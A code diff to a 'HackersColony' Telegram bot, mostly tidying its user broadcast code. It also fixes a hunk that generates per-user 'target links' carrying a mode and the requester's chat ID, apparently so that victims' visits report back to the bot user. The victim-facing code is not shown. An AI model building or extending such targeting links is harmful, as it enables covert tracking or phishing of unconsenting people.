@@ -4,15 +4,13 @@ from telebot import types
 
 app = Flask(__name__)
 
-# Configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
-ADMINS = [518067190, 7162565886]  # Both IDs can now broadcast
+ADMINS = [518067190, 7162565886]
 TG_CHANNEL = "https://t.me/HackersColony"
-YT_LINK = "https://youtube.com/@hackers_colony_tech?si=i4F-eC5-F8_O5uao"
+YT_LINK = "https://youtube.com/@HackersColony"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Database Setup for Broadcast
 def db_init():
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
@@ -27,7 +25,6 @@ time.sleep(2)
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    # Save user for broadcast
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
     cursor.execute('INSERT OR IGNORE INTO users (id) VALUES (?)', (message.chat.id,))
@@ -49,18 +46,11 @@ def broadcast(message):
         if msg_text == '/send':
             bot.reply_to(message, "Usage: /send Your Message")
             return
-        
-        conn = sqlite3.connect('users.db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT id FROM users')
-        users = cursor.fetchall()
-        conn.close()
-        
+        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
+        cursor.execute('SELECT id FROM users'); users = cursor.fetchall(); conn.close()
         success = 0
         for user in users:
-            try:
-                bot.send_message(user[0], msg_text)
-                success += 1
+            try: bot.send_message(user[0], msg_text); success += 1
             except: pass
         bot.reply_to(message, f"🎯 Broadcast sent to {success} users.")
 
@@ -77,6 +67,7 @@ def callback_query(call):
 
     elif "m_" in call.data:
         mode = call.data.replace("m_", "")
+        # Link generation fixed with correct host request
         target_link = f"https://{request.host}/?m={mode}&uid={call.message.chat.id}"
         response_text = (
             f"🤠 It's your target link 🔗\n\n"
